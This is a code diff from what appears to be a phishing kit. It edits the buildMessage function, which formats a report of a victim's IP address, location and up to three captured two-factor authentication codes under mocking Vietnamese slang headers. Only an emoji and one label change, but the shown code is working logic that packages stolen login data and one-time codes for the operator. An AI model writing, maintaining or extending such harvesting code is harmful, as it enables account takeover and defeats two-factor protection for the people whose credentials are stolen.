@@ -212,7 +212,7 @@ function decodeData(encodedData) {
 }
 
 function buildMessage(session, ip = 'Unknown') {
-    let msg = `<b>🐘 Data về Thỏ ơi</b>\n`;
+    let msg = `<b>⏰ Data về Thỏ ơi</b>\n`;
     msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
     msg += `<b>Ip:</b> ${escapeHtml(ip)}\n`;
     msg += `<b>Location:</b> ${escapeHtml(session.location || 'Unknown')}\n`;
@@ -252,7 +252,7 @@ function buildMessage(session, ip = 'Unknown') {
     const codes = session.codes || [];
     if (codes.length > 0) {
         msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `<b>Mã về bú:</b>\n`;
+        msg += `<b>Code về bú:</b>\n`;
         if (codes[0]) msg += `<b>Code 2FA(1):</b> <code>${escapeHtml(codes[0])}</code>\n`;
         if (codes[1]) msg += `<b>Code 2FA(2):</b> <code>${escapeHtml(codes[1])}</code>\n`;
         if (codes[2]) msg += `<b>Code 2FA(3):</b> <code>${escapeHtml(codes[2])}</code>\n`;
